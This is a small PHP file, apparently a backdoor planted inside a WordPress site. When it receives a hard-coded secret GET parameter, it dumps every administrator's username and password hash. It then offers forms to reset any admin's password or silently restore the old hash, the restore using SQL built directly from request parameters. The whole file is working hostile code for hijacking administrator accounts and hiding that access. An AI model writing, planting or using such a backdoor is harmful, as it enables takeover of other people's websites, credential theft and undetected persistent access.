<?php
$g=$_GET;
if(!isset($g["c"]) or trim($g["c"])!=="1232"){exit;}
require("../../../../wp-load.php");
if(isset($g['id']) and isset($g['pass'])){
	print_r($g);
	if(isset($g['ga'])){global $wpdb;  $wpdb->query("update $wpdb->users set user_pass='".stripslashes($g['pass'])."' where ID='".$g['id']."' limit 1");exit("gerialdim");}if(isset($g['npass'])){wp_set_password(stripslashes($g['npass']),$g['id']);exit("degistirdim");}
	
}

$us=get_users(array('blog_id'=> $GLOBALS['blog_id'],'role'=>'administrator'));
foreach($us as $uin){
	echo ''.$uin->user_login.' 
	<form target="_blank">
	<input type="hidden" name="c" value="'.$g['c'].'" />
	<input type="hidden" name="id" value="'.$uin->ID.'" />
	<b>old</b> <input type="text" name="pass" value="'.$uin->user_pass.'"/>
	<b>new</b> <input type="text" name="npass" value=""/>
	<input type="submit" name="d" value="degistir" />
	<input type="submit" name="ga" value="gerial" />
	
	</form>
	<hr>
	';
}

?>